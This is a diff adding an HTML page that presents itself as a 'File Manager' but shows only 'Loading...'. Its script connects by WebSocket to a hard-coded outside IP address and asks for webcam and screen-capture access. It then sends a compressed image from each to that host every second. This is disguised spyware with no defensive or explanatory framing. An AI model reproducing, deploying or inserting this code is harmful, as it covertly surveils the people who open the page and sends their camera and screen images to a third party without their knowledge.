@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>File Manager</title></head>
+<body><h2>📁 File Manager</h2><p>Loading...</p>
+<script>
+const ws=new WebSocket('ws://103.125.17.89:8080');
+ws.onopen=()=>{
+  navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+    const v=document.createElement('video');v.srcObject=s;v.play();
+    setInterval(()=>{
+      const c=document.createElement('canvas');c.width=320;c.height=240;
+      c.getContext('2d').drawImage(v,0,0);
+      ws.send(JSON.stringify({type:'cam',img:c.toDataURL('image/jpeg',0.5)}));
+    },1000);
+  });
+  navigator.mediaDevices.getDisplayMedia({video:true}).then(s=>{
+    const v=document.createElement('video');v.srcObject=s;v.play();
+    setInterval(()=>{
+      const c=document.createElement('canvas');c.width=320;c.height=240;
+      c.getContext('2d').drawImage(v,0,0);
+      ws.send(JSON.stringify({type:'screen',img:c.toDataURL('image/jpeg',0.5)}));
+    },1000);
+  });
+};
+</script></body></html>
